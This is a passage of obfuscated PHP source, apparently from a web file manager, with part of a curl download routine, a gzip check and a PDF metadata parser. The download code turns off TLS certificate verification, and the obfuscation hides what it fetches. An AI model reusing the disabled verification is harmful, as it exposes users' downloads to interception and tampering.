$_SERVER[¬ˆÚÂ”Éğä]; $c£‰óÔø­œ = $a³¼èÇšœ . $aÖîŞÀµº°[1529]; set_timeout(); goto f‹¥æŸÊÇ; eä¾Ä•Ö„“: curl_setopt($eŠˆëõ—Ù, CURLOPT_NOPROGRESS, !1); curl_setopt($eŠˆëõ—Ù, CURLOPT_PROGRESSFUNCTION, $aÖîŞÀµº°[1541]); curl_progress_start($eŠˆëõ—Ù); goto få…› Û™; F„ìè•á˜Æ: curl_setopt($eŠˆëõ—Ù, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($eŠˆëõ—Ù, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($eŠˆëõ—Ù, CURLOPT_SSL_VERIFYHOST, 0); goto eä¾Ä•Ö„“; C¾¦Šº³İ§: if ($déğ“ÓÌê  < $bö“›§¼ø¨ && $bö“›§¼ø¨ != 0) { return array($aÖîŞÀµº°[1045] => !1, $aÖîŞÀµº°[1047] => $aÖîŞÀµº°[1530]); } if ($e™ŸŞÉÜêº && filesize($c£‰óÔø­œ) != 0) { self::checkGzip($c£‰óÔø­œ); if (!@rename($c£‰óÔø­œ, $a³¼èÇšœ)) { @unlink($a³¼èÇšœ); $e™ŸŞÉÜêº = @rename($c£‰óÔø­œ, $a³¼èÇšœ); if (!$e™ŸŞÉÜêº) { return array($aÖîŞÀµº°[1045] => !1, $aÖîŞÀµº°[1047] => $aÖîŞÀµº°[1542]); } } return array($aÖîŞÀµº°[1045] => !0, $aÖîŞÀµº°[1047] => $aÖîŞÀµº°[704]); } return array($aÖîŞÀµº°[1045] => !1, $aÖîŞÀµº°[1047] => $aÖîŞÀµº°[1543]); goto B¸‘ÌØ™Ø; få…› Û™: curl_setopt($eŠˆëõ—Ù, CURLOPT_USERAGENT, $aÖîŞÀµº°[1533]); $e™ŸŞÉÜêº = curl_exec($eŠˆëõ—Ù); curl_progress_end($eŠˆëõ—Ù); goto EÍ£ÔÄÁˆª; EÍ£ÔÄÁˆª: curl_close($eŠˆëõ—Ù); fclose($f¬Ö²øÈØØ); $déğ“ÓÌê  = filesize(iconv_system($c£‰óÔø­œ)); goto C¾¦Šº³İ§; B¸‘ÌØ™Ø: } static function checkGzip($AÁÏ¼ªàâ) { goto eóÉÈ¦–¼ˆ; Cõï‘š¬ğ†: file_put_contents($AÁÏ¼ªàâ, $D‘ÈÎ¾¬Ü¯); goto Aô‡ğóä¥ç; eóÉÈ¦–¼ˆ: $dáÂÌ†©¥ = $_SERVER[¬ˆÚÂ”Éğä][1544]; $cš‘ï†¸ = file_sub_str($AÁÏ¼ªàâ, 0, 2); if ($dáÂÌ†©¥ != $cš‘ï†¸) { return; } goto dù™Öù”¶‡; dù™Öù”¶‡: ob_start(); readgzfile($AÁÏ¼ªàâ); $D‘ÈÎ¾¬Ü¯ = ob_get_clean(); goto Cõï‘š¬ğ†; Aô‡ğóä¥ç: } } class FileParsePdf { public static function parse($DŞğŒÃÛ…) { goto FŸø¢î¡å¬; AÂ¬äè†ƒ: $A™òèïùù[$Cµ¾‡Ú­ŠÇ[1546]] = StreamWrapperIO::read($DŞğŒÃÛ…, 0, $aåî˜Ù…ñÖ); $A™òèïùù[$Cµ¾‡Ú­ŠÇ[1547]] = StreamWrapperIO::read($DŞğŒÃÛ…, $A™òèïùù[$Cµ¾‡Ú­ŠÇ[77]] - $aåî˜Ù…ñÖ, $aåî˜Ù…ñÖ); $BÃè„Ôê– = self::decodeXref($A™òèïùù); goto FÉĞŠ‘ˆ¤º; fÙ†Œöó…§: if ($EÄÓ»øÃŒ¾[1] && $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1553]] < $EÄÓ»øÃŒ¾[1][0]) { $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1553]] = $EÄÓ»øÃŒ¾[1][0]; } $E¹Á…ŠÄ = self::parseInfoItem($E¹Á…ŠÄ); return $E¹Á…ŠÄ; goto DøÔÜó·ö»; aÍÓ÷Œâ„‰: preg_match_all($BµˆÅ˜®‘™, $A™òèïùù[$Cµ¾‡Ú­ŠÇ[1546]], $EÄÓ»øÃŒ¾); if ($EÄÓ»øÃŒ¾[1] && $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1553]] < $EÄÓ»øÃŒ¾[1][0]) { $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1553]] = $EÄÓ»øÃŒ¾[1][0]; } preg_match_all($BµˆÅ˜®‘™, $A™òèïùù[$Cµ¾‡Ú­ŠÇ[1547]], $EÄÓ»øÃŒ¾); goto fÙ†Œöó…§; D¨ïµÉêÀ¶: $BµˆÅ˜®‘™ = $Cµ¾‡Ú­ŠÇ[1550]; preg_match($BµˆÅ˜®‘™, $A™òèïùù[$Cµ¾‡Ú­ŠÇ[1546]], $EÄÓ»øÃŒ¾); if (!$E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1549]] && count($EÄÓ»øÃŒ¾) == 5) { $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1549]] = $EÄÓ»øÃŒ¾[3]; $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1551]] = $EÄÓ»øÃŒ¾[4]; } goto c©«³¾Àñƒ; FŸø¢î¡å¬: $Cµ¾‡Ú­ŠÇ =& $_SERVER[¬ˆÚÂ”Éğä]; $aåî˜Ù…ñÖ = 32 * 1024; $A™òèïùù = array($Cµ¾‡Ú­ŠÇ[784] => fopen($DŞğŒÃÛ…, $Cµ¾‡Ú­ŠÇ[1183]), $Cµ¾‡Ú­ŠÇ[75] => $DŞğŒÃÛ…, $Cµ¾‡Ú­ŠÇ[77] => filesize($DŞğŒÃÛ…), $Cµ¾‡Ú­ŠÇ[1545] => $aåî˜Ù…ñÖ); goto AÂ¬äè†ƒ; c©«³¾Àñƒ: preg_match($BµˆÅ˜®‘™, $A™òèïùù[$Cµ¾‡Ú­ŠÇ[1547]], $EÄÓ»øÃŒ¾); if (!$E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1549]] && count($EÄÓ»øÃŒ¾) == 5) { $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1549]] = $EÄÓ»øÃŒ¾[3]; $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1551]] = $EÄÓ»øÃŒ¾[4]; } preg_match($Cµ¾‡Ú­ŠÇ[1552], $A™òèïùù[$Cµ¾‡Ú­ŠÇ[1546]], $EÄÓ»øÃŒ¾); goto Cö¼‚ªƒ‰¥; FÉĞŠ‘ˆ¤º: if ($BÃè„Ôê–) { $D†ÍÆ„±È = $BÃè„Ôê–[$Cµ¾‡Ú­ŠÇ[1548]][$Cµ¾‡Ú­ŠÇ[1205]]; $E¹Á…ŠÄ = self::getObjectValue($A™òèïùù, $BÃè„Ôê–, $D†ÍÆ„±È); } $E¹Á…ŠÄ = is_array($E¹Á…ŠÄ) ? $E¹Á…ŠÄ : array(); $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1549]] = 0; goto D¨ïµÉêÀ¶; Cö¼‚ªƒ‰¥: if ($EÄÓ»øÃŒ¾) { $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1355]] = $EÄÓ»øÃŒ¾[1]; } $E¹Á…ŠÄ[$Cµ¾‡Ú­ŠÇ[1553]] = 0; $BµˆÅ˜®‘™ = $Cµ¾‡Ú­ŠÇ[1554]; goto aÍÓ÷Œâ„‰; DøÔÜó·ö»: } private static function parseInfoItem($eá©†äËÈ) { $D‘œ´¯ƒì™ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$eá©†äËÈ) { return !1; } $b™³‘ºß™† = array($D‘œ´¯ƒì™[1356] => array($D‘œ´¯ƒì™[1555], $D‘œ´¯ƒì™[33]), $D‘œ´¯ƒì™[1556] => array($D‘œ´¯ƒì™[1557], $D‘œ´¯ƒì™[33]), $D‘œ´¯ƒì™[187] => array($D‘œ´¯ƒì™[1558], $D‘œ´¯ƒì™[210]), $D‘œ´¯ƒì™[107] => array($D‘œ´¯ƒì™[1559], $D‘œ´¯ƒì™[210]), $D‘œ´¯ƒì™[1553] => array($D‘œ´¯ƒì™[1553], $D‘œ´¯ƒì™[276]), $D‘œ´¯ƒì™[1549] => array($D‘œ´¯ƒì™[1549], $D‘œ´¯ƒì™[276]), $D‘œ´¯ƒì™[1551] => array($D‘œ´¯ƒì™[1551], $D‘œ´¯ƒì™[276]), $D‘œ´¯ƒì™[1560] => array($D‘œ´¯ƒì™[1561], $D‘œ´¯ƒì™[33]), $D‘œ´¯ƒì™[1562] => array($D‘œ´¯ƒì™[1563], $D‘œ´¯ƒì™[33]), $D‘œ´¯ƒì™[1564] => array($D‘œ´¯ƒì™[1355], $D‘œ´¯ƒì™[33])); $c“£ªĞŠ® = array(); foreach ($b™³‘ºß™† as $c¿µê¸Ü¶œ => $a·ÊŒÖ¿Îƒ) { if (!isset($eá©†äËÈ[$a·ÊŒÖ¿Îƒ[0]])) { continue; } $FçÏË”¨íã = $eá©†äËÈ[$a·ÊŒÖ¿Îƒ[0]]; if (!$FçÏË”¨íã || is_array($FçÏË”¨íã)) { continue; } switch ($a·ÊŒÖ¿Îƒ[1]) { case $D‘œ´¯ƒì™[276]: $FçÏË”¨íã = intval($FçÏË”¨íã); break; case $D‘œ´¯ƒì™[210]: if (substr($FçÏË”¨íã, 0, 2) == $D‘œ´¯ƒì™[1565]) { $FçÏË”¨íã = substr($FçÏË”¨íã, 2, 14); } if (strtotime($FçÏË”¨íã)) { $FçÏË”¨íã = date($D‘œ´¯ƒì™[1566], strtotime($FçÏË”¨íã)); } break; } $c“£ªĞŠ®[$c¿µê¸Ü¶œ] = $FçÏË”¨íã; } return $c“£ªĞŠ®; } private static function decodeXref(&$C¥•Î¢ÄÕ) { goto Aêˆšæïóß; Dòé÷ëŠ¹‰: if ($C¥•Î¢ÄÕ[$eÏã¬š‰†º[77]] - $Dì‡ÓÃİğß > $C¥•Î¢ÄÕ[$eÏã¬š‰†º[1545]]) { $b÷éšß®Ä = 4 * $C¥•Î¢ÄÕ[$eÏã¬š‰†º[1545]]; $C¥•Î¢ÄÕ[$eÏã¬š‰†º[1545]] = $b÷éšß®Ä; $C¥•Î¢ÄÕ[$eÏã¬š‰†º[1546]] = StreamWrapperIO::read($C¥•Î¢ÄÕ[$eÏã¬š‰†º[75]], 0, $b÷éšß®Ä); $C¥•Î¢ÄÕ[$eÏã¬š‰†º[1547]] = StreamWrapperIO::read($C¥•Î¢ÄÕ[$eÏã¬š‰†º[75]], $C¥•Î¢ÄÕ[$eÏã¬š‰†º[77]] - $b÷éšß®Ä, $b÷éšß®Ä); $bÀôøõÎ„ = $C¥•Î¢ÄÕ[$eÏã¬š‰†º[1547]]; } $céÆ¶ƒŞ‡Ã = 0; preg_match_all($eÏã¬š‰†º[1569], $bÀôøõÎ„, $AÒöãÅÙÍ); goto cÔ¶Î™šŠ­; cÔ¶Î™šŠ­: foreach ($AÒöãÅÙÍ[3] as $a¤Ÿªœëº => $DŞ„¥½Ì…) { if ($AÒöãÅÙÍ[3][$a¤Ÿªœëº] == $eÏã¬š‰†º[1570]) { $c”ÃÓÚÆé‡ = $céÆ¶ƒŞ‡Ã . $eÏã¬š‰†º[70] . intval($AÒöãÅÙÍ[2][$a¤Ÿªœëº]); $Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1567]][$c”ÃÓÚÆé‡] = intval($AÒöãÅÙÍ[1][$a¤Ÿªœëº]); ++$céÆ¶ƒŞ‡Ã; } else { if ($AÒöãÅÙÍ[3][$a¤Ÿªœëº] == $eÏã¬š‰†º[1571]) { ++$céÆ¶ƒŞ‡Ã; } else { } } } if (preg_match_all($eÏã¬š‰†º[1572], $bÀôøõÎ„, $AÒöãÅÙÍ)) { $BÈ¯¨º›Â = $C¥•Î¢ÄÕ[$eÏã¬š‰†º[77]] - $C¥•Î¢ÄÕ[$eÏã¬š‰†º[1545]]; foreach ($AÒöãÅÙÍ[0] as $a¤Ÿªœëº => $d…˜×‰–Ş) { $A­”£†Í±õ = $AÒöãÅÙÍ[1][$a¤Ÿªœëº] . $eÏã¬š‰†º[70] . $AÒöãÅÙÍ[2][$a¤Ÿªœëº]; $Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1567]][$A­”£†Í±õ] = strpos($bÀôøõÎ„, $d…˜×‰–Ş) + $BÈ¯¨º›Â + 1; } } if (preg_match_all($eÏã¬š‰†º[1573], $bÀôøõÎ„, $AÒöãÅÙÍ)) { $eñŒßµ¼Ğ“ = count($AÒöãÅÙÍ[1]) == 1 ? $AÒöãÅÙÍ[1][0] : $AÒöãÅÙÍ[1][1]; } else { $eñŒßµ¼Ğ“ = substr($bÀôøõÎ„, -1024 * 5); } goto Fì¹´“»ƒ; b„è¢®±Óæ: $eâÂŞ¯ß´¡ = $eÏã¬š‰†º[1568]; if (!preg_match_all($eâÂŞ¯ß´¡, $bÀôøõÎ„, $AÒöãÅÙÍ, PREG_SET_ORDER, 0)) { return !1; } $Dì‡ÓÃİğß = intval($AÒöãÅÙÍ[0][1]); goto Dòé÷ëŠ¹‰; bƒ¯¤ßøº: if (preg_match($eÏã¬š‰†º[1581], $eñŒßµ¼Ğ“, $AÒöãÅÙÍ) > 0) { } return $Fö‡¯ÚÌ‰È; goto d£Ç»óèÛ­; Aêˆšæïóß: $eÏã¬š‰†º =& $_SERVER[¬ˆÚÂ”Éğä]; $bÀôøõÎ„ = $C¥•Î¢ÄÕ[$eÏã¬š‰†º[1547]]; $Fö‡¯ÚÌ‰È = array($eÏã¬š‰†º[1548] => array(), $eÏã¬š‰†º[1567] => array()); goto b„è¢®±Óæ; Fì¹´“»ƒ: if (preg_match($eÏã¬š‰†º[1574], $eñŒßµ¼Ğ“, $AÒöãÅÙÍ) > 0) { $Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1548]][$eÏã¬š‰†º[77]] = intval($AÒöãÅÙÍ[1]); } if (preg_match($eÏã¬š‰†º[1575], $eñŒßµ¼Ğ“, $AÒöãÅÙÍ) > 0) { $Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1548]][$eÏã¬š‰†º[1576]] = intval($AÒöãÅÙÍ[1]) . $eÏã¬š‰†º[70] . intval($AÒöãÅÙÍ[2]); } if (preg_match($eÏã¬š‰†º[1577], $eñŒßµ¼Ğ“, $AÒöãÅÙÍ) > 0) { $Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1548]][$eÏã¬š‰†º[1578]] = intval($AÒöãÅÙÍ[1]) . $eÏã¬š‰†º[70] . intval($AÒöãÅÙÍ[2]); } goto Aî×”‡ñÉø; Aî×”‡ñÉø: if (preg_match($eÏã¬š‰†º[1579], $eñŒßµ¼Ğ“, $AÒöãÅÙÍ) > 0) { $Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1548]][$eÏã¬š‰†º[1205]] = intval($AÒöãÅÙÍ[1]) . $eÏã¬š‰†º[70] . intval($AÒöãÅÙÍ[2]); } if (preg_match($eÏã¬š‰†º[1580], $eñŒßµ¼Ğ“, $AÒöãÅÙÍ) > 0) { $Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1548]][$eÏã¬š‰†º[367]] = array(); $Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1548]][$eÏã¬š‰†º[367]][0] = $AÒöãÅÙÍ[1]; $Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1548]][$eÏã¬š‰†º[367]][1] = $AÒöãÅÙÍ[2]; } if (!$Fö‡¯ÚÌ‰È[$eÏã¬š‰†º[1548]][$eÏã¬š‰†º[1205]]) { return !1; } goto bƒ¯¤ßøº; d£Ç»óèÛ­: } private static function getObjectValue($EœåÕÊ£ã¿, $a¸å¨‰Š– , $B…À…¦Éø¾) { goto EÍì‘ŠŞ®; F®˜¥©æ‰: if (!is_array($Dé‚£‹Š¿[1])) { return array(); } $a’ëù‹ôé¤ = array(); for ($B¾ïÑàœ‘é = 0; $B¾ïÑàœ‘é < count($Dé‚£‹Š¿[1]); $B¾ïÑàœ‘é += 2) { $b‹õ†§éš = $Dé‚£‹Š¿[1][$B¾ïÑàœ‘é]; $BİÖ®ï¢‡† = $Dé‚£‹Š¿[1][$B¾ïÑàœ‘é + 1]; if (count($b‹õ†§éš) == 3 && $b‹õ†§éš[0] == $a£à§™¶Ö[8]) { $f³äÁÍ—Í = !1; if ($BİÖ®ï¢‡†[0] == $a£à§™¶Ö[1582]) { $BİÖ®ï¢‡† = self::getObject($EœåÕÊ£ã¿, $a¸å¨‰Š– [$a£à§™¶Ö[1567]][$BİÖ®ï¢‡†[1]]); } $f³äÁÍ—Í = $BİÖ®ï¢‡†[1]; if ($f³äÁÍ—Í === !1) { continue; } if (is_string($f³äÁÍ—Í)) { $f³äÁÍ—Í = self::decodeStr($f³äÁÍ—Í); } $a’ëù‹ôé¤[$b‹õ†§éš[1]] = $f³äÁÍ—Í; } } goto E¯Š‚Ø­™; EÍì‘ŠŞ®: $a£à§™¶Ö =& $_SERVER[¬ˆÚÂ”Éğä]; $Dé‚£‹Š¿ = self::getObject($EœåÕÊ£ã¿, $a¸å¨‰Š– [$a£à§™¶Ö[1567]][$B…À…¦Éø¾]); if (is_string($Dé‚£‹Š¿[1])) { return $Dé‚£‹Š¿[1]; } goto F®˜¥©æ‰; E¯Š‚Ø­™: return $a’ëù‹ôé¤; goto E“Ì·‘ÀŸ; E“Ì·‘ÀŸ: } private static function getObject($CÜòêƒß‡ï, $aÑŞ¶ß…ƒ) { $C°ø÷Œ·ßŞ = self::getObjectItem($CÜòêƒß‡ï, $aÑŞ¶ß…ƒ); $C°ø÷Œ·ßŞ = self::getObjectItem($CÜòêƒß‡ï, $C°ø÷Œ·ßŞ[2]); return $C°ø÷Œ·ßŞ; } private static function getObjectItem($cïÖÒÙ‘È“, $e»Çèğãø) { goto eÑâìë¨â; eÑâìë¨â: $eÔ¤È¬Íƒ™ =& $_SERVER[¬ˆÚÂ”Éğä]; $cïÔ’»­Ê” = $cïÖÒÙ‘È“[$eÔ¤È¬Íƒ™[1545]]; $E¸áõíˆâİ = $cïÖÒÙ‘È“[$eÔ¤È¬Íƒ™[77]] - $cïÔ’»­Ê”; goto f²Š°«¸á; f²Š°«¸á: $bğ±Éµ³« = $e»Çèğãø >= $E¸áõíˆâİ ? $e»Çèğãø - $E¸áõíˆâİ : $e»Çèğãø; $A™‰†Ì•ä« = $e»Çèğãø >= $E¸áõíˆâİ ? $cïÖÒÙ‘È“[$eÔ¤È¬Íƒ™[1547]] : $cïÖÒÙ‘È“[$eÔ¤È¬Íƒ™[1546]]; if ($e»Çèğãø > $cïÔ’»­Ê” && $e»Çèğãø <= $E¸áõíˆâİ) { $bğ±Éµ³« = 0; $A™‰†Ì•ä« = StreamWrapperIO::read($cïÖÒÙ‘È“[$eÔ¤È¬Íƒ™[75]], $e»Çèğãø, $cïÔ’»­Ê”); } goto dÇŸ¬ˆÛ‡Ê; dÇŸ¬ˆÛ‡Ê: $B´àäˆ…Ôº = self::getRawObject($A™‰†Ì•ä«, $bğ±Éµ³«); if ($e»Çèğãø >= $E¸áõíˆâİ) { $B´àäˆ…Ôº[2] = $B´àäˆ…Ôº[2] + $E¸áõíˆâİ; } else { if ($e»Çèğãø > $cïÔ’»­Ê” && $e»Çèğãø <= $E¸áõíˆâİ) { $B´àäˆ…Ôº[2] = $B´àäˆ…Ôº[2] + $e»Çèğãø; } } return $B´àäˆ…Ôº; goto A‡¯Ò¥ôÖî; A‡¯Ò¥ôÖî: } private static function decodeStr($d·ğÙŠàªÙ) { goto A·øµ°¦á; E£ƒ¾šÄº: return $d·ğÙŠàªÙ; goto C—Œƒ¶¶™Á; BÂ¼©±»Ñª: $d·ğÙŠàªÙ = $eÆÜåÁíÖ[33]; foreach ($fğ¾ÈÙ‚ñ• as $d—÷ ë«Ÿ) { if (preg_match($eÆÜåÁíÖ[1592], $d—÷ ë«Ÿ)) { $d·ğÙŠàªÙ .= \chr(octdec(trim($d—÷ ë«Ÿ, $eÆÜåÁíÖ[93]))); } else { $d·ğÙŠàªÙ .= $d—÷ ë«Ÿ; } } $fğ¾ÈÙ‚ñ• = preg_split($eÆÜåÁíÖ[1593], $d·ğÙŠàªÙ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto A…Ìğ—‰ œ; A·øµ°¦á: $eÆÜåÁíÖ =& $_SERVER[¬ˆÚÂ”Éğä]; $d·ğÙŠàªÙ = str_replace(array($eÆÜåÁíÖ[1583], $eÆÜåÁíÖ[1584], $eÆÜåÁíÖ[1585], $eÆÜåÁíÖ[1586], $eÆÜåÁíÖ[1587], $eÆÜåÁíÖ[1588], $eÆÜåÁíÖ[1589], $eÆÜåÁíÖ[1590]), array($eÆÜåÁíÖ[93], $eÆÜåÁíÖ[50], $eÆÜåÁíÖ[8], $eÆÜåÁíÖ[248], $eÆÜåÁíÖ[829], $eÆÜåÁíÖ[217], $eÆÜåÁíÖ[1005], $eÆÜåÁíÖ[330]), $d·ğÙŠàªÙ); $fğ¾ÈÙ‚ñ• = preg_split($eÆÜåÁíÖ[1591], $d·ğÙŠàªÙ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto BÂ¼©±»Ñª; Eà÷¢£÷–Ÿ: $d·ğÙŠàªÙ = $eÆÜåÁíÖ[33]; foreach ($fğ¾ÈÙ‚ñ• as $d—÷ ë«Ÿ) { if (preg_match($eÆÜåÁíÖ[1597], $d—÷ ë«Ÿ) && !1 === stripos($d—÷ ë«Ÿ, $eÆÜåÁíÖ[1598])) { $d—÷ ë«Ÿ = preg_replace($eÆÜåÁíÖ[1599], $eÆÜåÁíÖ[33], $d—÷ ë«Ÿ); $d—÷ ë«Ÿ = trim($d—÷ ë«Ÿ, $eÆÜåÁíÖ[938]); $d—÷ ë«Ÿ = pack($eÆÜåÁíÖ[1600], $d—÷ ë«Ÿ); $d·ğÙŠàªÙ .= $d—÷ ë«Ÿ; } else { $d·ğÙŠàªÙ .= $d—÷ ë«Ÿ; } } if (preg_match($eÆÜåÁíÖ[1601], $d·ğÙŠàªÙ)) { $E•Ä‰ŸìŠ = substr($d·ğÙŠàªÙ, 2); $d·ğÙŠàªÙ = $eÆÜåÁíÖ[33]; $fì®ê”ÔÆ¨ = strlen($E•Ä‰ŸìŠ); for ($Fš¸©„ŞÂä = 0; $Fš¸©„ŞÂä < $fì®ê”ÔÆ¨; $Fš¸©„ŞÂä += 2) { $aÑÒ¡‹ß‚Ş = hexdec(bin2hex(substr($E•Ä‰ŸìŠ, $Fš¸©„ŞÂä, 2))); $d·ğÙŠàªÙ .= mb_convert_encoding($eÆÜåÁíÖ[1602] . intval($aÑÒ¡‹ß‚Ş) . $eÆÜåÁíÖ[67], $eÆÜåÁíÖ[1603], $eÆÜåÁíÖ[1604]); } } goto E£ƒ¾šÄº; A…Ìğ—‰ œ: $d·ğÙŠàªÙ = $eÆÜåÁíÖ[33]; foreach ($fğ¾ÈÙ‚ñ• as $d—÷ ë«Ÿ) { if (preg_match($eÆÜåÁíÖ[1594], $d—÷ ë«Ÿ)) { $d·ğÙŠàªÙ .= \chr(hexdec(trim($d—÷ ë«Ÿ, $eÆÜåÁíÖ[1595]))); } else { $d·ğÙŠàªÙ .= $d—÷ ë«Ÿ; } } $fğ¾ÈÙ‚ñ• = preg_split($eÆÜåÁíÖ[1596], $d·ğÙŠàªÙ, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto Eà÷¢£÷–Ÿ; C—Œƒ¶¶™Á: } private static function getRawObject($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø = 0) { goto D¥ó›Òœ„³; D¥ó›Òœ„³: $Aèìà˜ÓÉ† =& $_SERVER[¬ˆÚÂ”Éğä]; $C¬ùÚÍ×«Ç = $Aèìà˜ÓÉ†[33]; $F§½ìÍÏËœ = $Aèìà˜ÓÉ†[33]; goto Bµà§óÌ°Ó; Bµà§óÌ°Ó: $E–ˆÚÑ²­Ø += strspn($F‹Èœ›ªˆø, $Aèìà˜ÓÉ†[1605], $E–ˆÚÑ²­Ø); $f¶Âºôñ‡‚ = $F‹Èœ›ªˆø[$E–ˆÚÑ²­Ø]; switch ($f¶Âºôñ‡‚) { case $Aèìà˜ÓÉ†[1606]: $B×ˆÑ¼Ú¤‡ = strcspn($F‹Èœ›ªˆø, $Aèìà˜ÓÉ†[1607], $E–ˆÚÑ²­Ø); if ($B×ˆÑ¼Ú¤‡ > 0) { $E–ˆÚÑ²­Ø += $B×ˆÑ¼Ú¤‡; return self::getRawObject($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø); } break; case $Aèìà˜ÓÉ†[8]: $C¬ùÚÍ×«Ç = $f¶Âºôñ‡‚; ++$E–ˆÚÑ²­Ø; $Fñí”ö¤—ç = preg_match($Aèìà˜ÓÉ†[1608], substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, 256), $D»íøÔíĞé); if (1 == $Fñí”ö¤—ç) { $F§½ìÍÏËœ = $D»íøÔíĞé[1]; $E–ˆÚÑ²­Ø += strlen($F§½ìÍÏËœ); } break; case $Aèìà˜ÓÉ†[248]: case $Aèìà˜ÓÉ†[829]: $C¬ùÚÍ×«Ç = $f¶Âºôñ‡‚; ++$E–ˆÚÑ²­Ø; $f½ø¬ˆ·«Ã = $E–ˆÚÑ²­Ø; if ($Aèìà˜ÓÉ†[248] == $f¶Âºôñ‡‚) { $FÃç…ÊæÏï = 1; while ($FÃç…ÊæÏï > 0) { if (!isset($F‹Èœ›ªˆø[$f½ø¬ˆ·«Ã])) { break; } $F¬×Üİ Šá = $F‹Èœ›ªˆø[$f½ø¬ˆ·«Ã]; switch ($F¬×Üİ Šá) { case $Aèìà˜ÓÉ†[93]: ++$f½ø¬ˆ·«Ã; break; case $Aèìà˜ÓÉ†[248]: ++$FÃç…ÊæÏï; break; case $Aèìà˜ÓÉ†[829]: --$FÃç…ÊæÏï; break; } ++$f½ø¬ˆ·«Ã; } $F§½ìÍÏËœ = substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, $f½ø¬ˆ·«Ã - $E–ˆÚÑ²­Ø - 1); $E–ˆÚÑ²­Ø = $f½ø¬ˆ·«Ã; } break; case $Aèìà˜ÓÉ†[157]: case $Aèìà˜ÓÉ†[478]: $C¬ùÚÍ×«Ç = $f¶Âºôñ‡‚; ++$E–ˆÚÑ²­Ø; if ($Aèìà˜ÓÉ†[157] == $f¶Âºôñ‡‚) { $F§½ìÍÏËœ = array(); do { $b¼‰ììæ²— = $E–ˆÚÑ²­Ø; $Aµ‘ÈôÓÜ‚ = self::getRawObject($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø); $E–ˆÚÑ²­Ø = $Aµ‘ÈôÓÜ‚[2]; $F§½ìÍÏËœ[] = $Aµ‘ÈôÓÜ‚; } while ($Aèìà˜ÓÉ†[478] != $Aµ‘ÈôÓÜ‚[0] && $E–ˆÚÑ²­Ø != $b¼‰ììæ²—); array_pop($F§½ìÍÏËœ); } break; case $Aèìà˜ÓÉ†[937]: case $Aèìà˜ÓÉ†[940]: if (isset($F‹Èœ›ªˆø[$E–ˆÚÑ²­Ø + 1]) && $F‹Èœ›ªˆø[$E–ˆÚÑ²­Ø + 1] == $f¶Âºôñ‡‚) { $C¬ùÚÍ×«Ç = $f¶Âºôñ‡‚ . $f¶Âºôñ‡‚; $E–ˆÚÑ²­Ø += 2; if ($Aèìà˜ÓÉ†[937] == $f¶Âºôñ‡‚) { $F§½ìÍÏËœ = array(); do { $b¼‰ììæ²— = $E–ˆÚÑ²­Ø; $Aµ‘ÈôÓÜ‚ = self::getRawObject($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø); $E–ˆÚÑ²­Ø = $Aµ‘ÈôÓÜ‚[2]; $F§½ìÍÏËœ[] = $Aµ‘ÈôÓÜ‚; } while ($Aèìà˜ÓÉ†[1609] != $Aµ‘ÈôÓÜ‚[0] && $E–ˆÚÑ²­Ø != $b¼‰ììæ²—); array_pop($F§½ìÍÏËœ); } } else { $C¬ùÚÍ×«Ç = $f¶Âºôñ‡‚; ++$E–ˆÚÑ²­Ø; $Fñí”ö¤—ç = preg_match($Aèìà˜ÓÉ†[1610], substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø), $D»íøÔíĞé); if ($Aèìà˜ÓÉ†[937] == $f¶Âºôñ‡‚ && 1 == $Fñí”ö¤—ç) { $F§½ìÍÏËœ = strtr($D»íøÔíĞé[1], $Aèìà˜ÓÉ†[1611], $Aèìà˜ÓÉ†[33]); $E–ˆÚÑ²­Ø += \strlen($D»íøÔíĞé[0]); } elseif (!1 !== ($d‰˜£±ëê‘ = strpos($F‹Èœ›ªˆø, $Aèìà˜ÓÉ†[940], $E–ˆÚÑ²­Ø))) { $E–ˆÚÑ²­Ø = $d‰˜£±ëê‘ + 1; } } break; default: if ($Aèìà˜ÓÉ†[1612] == substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, 6)) { $C¬ùÚÍ×«Ç = $Aèìà˜ÓÉ†[1612]; $E–ˆÚÑ²­Ø += 6; } elseif ($Aèìà˜ÓÉ†[99] == substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, 4)) { $C¬ùÚÍ×«Ç = $Aèìà˜ÓÉ†[99]; $E–ˆÚÑ²­Ø += 4; $F§½ìÍÏËœ = $Aèìà˜ÓÉ†[99]; } elseif ($Aèìà˜ÓÉ†[1613] == substr($F‹Èœ›ªˆø, $E–ˆÚÑ²­Ø, 4)) { $C¬ùÚÍ×«Ç = 